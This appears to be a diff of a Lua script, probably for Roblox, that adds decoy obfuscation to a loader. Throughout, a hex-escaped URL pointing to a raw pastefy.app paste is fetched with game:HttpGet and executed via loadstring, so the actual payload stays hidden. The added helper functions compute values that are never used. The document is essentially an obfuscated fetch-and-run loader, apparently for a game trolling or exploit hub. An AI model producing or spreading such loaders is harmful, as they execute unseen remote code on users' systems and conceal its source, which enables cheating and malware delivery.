@@ -1,4 +1,15 @@
 -- ASCII Obfuscation Level [1/2] Difficulty [Hard] [You Might Be Wondering Why Am i Typing This Well This is Just For Fun]
-l_o = "\104\x74\x74\x70\x3a" .. "\x2f\x2f" .. "\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70" .. "\x2f\x49\x33\x4c\x31\x75\x6f\x51\x67\x2f\x72\x61\x77"
-l_s = loadstring
-l_s((function (l_o) return l_o end)(game:HttpGet(l_o)))()
+local I_obfuscated_this = "\x72\x61\x6e\x64\x6f\x6d" .. "\x53\x74\x75\x66\x66"
+local joinString = function(a, b) return a .. b end
+
+local obfFunc1 = function(x) return string.reverse(x) end
+local obfFunc2 = function(x) return string.char(string.byte(x) + 1) end
+
+local ultimateTrollingHubEasygg = "\104\x74\x74\x70\x3a" .. "\x2f\x2f" .. "\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70" .. "\x2f\x49\x33\x4c\x31\x75\x6f\x51\x67\x2f\x72\x61\x77"
+local omg = loadstring
+
+local temp = joinString("\x67\x61\x6d\x65", "\x3a\x48\x74\x74\x70\x47\x65\x74")
+local reversed = obfFunc1(temp)
+local encoded = obfFunc2(reversed)
+
+omg((function (ultimateTrollingHubEasygg) return ultimateTrollingHubEasygg end)(game:HttpGet(ultimateTrollingHubEasygg)))()
